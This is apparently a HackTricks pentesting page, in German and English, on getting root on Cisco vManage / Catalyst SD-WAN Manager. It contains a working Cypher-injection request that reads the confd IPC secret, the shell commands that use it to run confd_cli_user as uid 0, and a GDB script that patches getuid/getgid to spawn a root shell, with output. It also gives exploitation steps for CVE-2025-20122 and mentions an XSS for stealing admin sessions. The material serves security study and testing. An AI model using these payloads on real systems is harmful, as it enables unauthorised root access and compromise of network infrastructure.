# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Pfad 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nach etwas Recherche in der [documentation](http://66.218.245.39/doc/html/rn03re18.html) zu `confd` und den verschiedenen binaries (zugänglich mit einem Account auf der Cisco-Website) stellten wir fest, dass zur Authentifizierung des IPC-Sockets ein secret verwendet wird, das in `/etc/confd/confd_ipc_secret` gespeichert ist:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Erinnerst du dich an unsere Neo4j-Instanz? Sie läuft mit den Rechten des Benutzers `vmanage`, wodurch wir die Datei mithilfe der vorherigen Schwachstelle abrufen können:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Das Programm `confd_cli` unterstützt keine Kommandozeilenargumente, ruft aber `/usr/bin/confd_cli_user` mit Argumenten auf. Daher könnten wir `/usr/bin/confd_cli_user` direkt mit unseren eigenen Argumenten aufrufen. Allerdings ist es mit unseren aktuellen Rechten nicht lesbar, also müssen wir es aus dem rootfs holen und mit scp kopieren, die Hilfe lesen und es verwenden, um die Shell zu bekommen:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Pfad 2

(Beispiel aus [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Der Blog¹ des synacktiv-Teams beschrieb eine elegante Methode, um eine root shell zu erhalten, aber der Haken ist, dass dafür eine Kopie von `/usr/bin/confd_cli_user` benötigt wird, die nur von root lesbar ist. Ich habe einen anderen Weg gefunden, um ohne diesen Aufwand auf root zu eskalieren.

Als ich die Binärdatei `/usr/bin/confd_cli` disassemblierte, beobachtete ich Folgendes:

<details>
<summary>Objdump zeigt UID/GID-Erfassung</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Wenn ich „ps aux“ ausführe, beobachte ich Folgendes (_Hinweis -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ich vermutete, dass das Programm “confd_cli” die Benutzer-ID und Gruppen-ID, die es vom eingeloggten Benutzer gesammelt hat, an die Anwendung “cmdptywrapper” weitergibt.

Mein erster Versuch war, “cmdptywrapper” direkt mit `-g 0 -u 0` auszuführen, aber es schlug fehl. Offenbar wurde unterwegs ein Dateideskriptor (-i 1015) erstellt, den ich nicht vortäuschen kann.

Wie im Blog von synacktiv (letztes Beispiel) erwähnt, unterstützt das Programm `confd_cli` keine Kommandozeilenargumente, aber ich kann es mit einem Debugger beeinflussen und glücklicherweise ist GDB auf dem System vorhanden.

Ich habe ein GDB-Skript erstellt, in dem ich die APIs `getuid` und `getgid` dazu zwang, 0 zurückzugeben. Da ich bereits durch die deserialization RCE die “vmanage”-Privilegien habe, habe ich die Berechtigung, die Datei `/etc/confd/confd_ipc_secret` direkt zu lesen.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Konsolenausgabe:

<details>
<summary>Konsolenausgabe</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Pfad 3 (2025 CLI input validation bug)

Cisco renamed vManage to *Catalyst SD-WAN Manager*, but the underlying CLI still runs on the same box. Eine 2025er Advisory (CVE-2025-20122) beschreibt unzureichende Eingabevalidierung in der CLI, die es **jedem authentifizierten lokalen Benutzer** erlaubt, Root zu erlangen, indem eine manipulierte Anfrage an den Manager CLI-Dienst gesendet wird. Kombiniere jeden low-priv foothold (z. B. die Neo4j deserialization aus Path1 oder eine cron/backup user shell) mit dieser Schwachstelle, um ohne Kopieren von `confd_cli_user` oder Anhängen von GDB auf Root zu springen:

1. Use your low-priv shell to locate the CLI IPC endpoint (typically the `cmdptywrapper` listener shown on port 4565 in Path2).
2. Craft a CLI request that forges UID/GID fields to 0. The validation bug fails to enforce the original caller’s UID, so the wrapper launches a root-backed PTY.
3. Pipe any command sequence (`vshell; id`) through the forged request to obtain a root shell.

> Die Angriffsfläche ist lokal; remote code execution ist weiterhin erforderlich, um die initiale Shell zu landen, aber einmal auf dem System ist die Ausnutzung eine einzelne IPC-Nachricht statt eines debugger-basierten UID-Patches.

## Andere kürzlich entdeckte vManage/Catalyst SD-WAN Manager-Schwachstellen zum Verketten

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; das Stehlen einer Admin-Session verschafft dir einen browser-driven Pfad zu `vshell` → lokale Shell → Path3 für Root.

## Referenzen

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
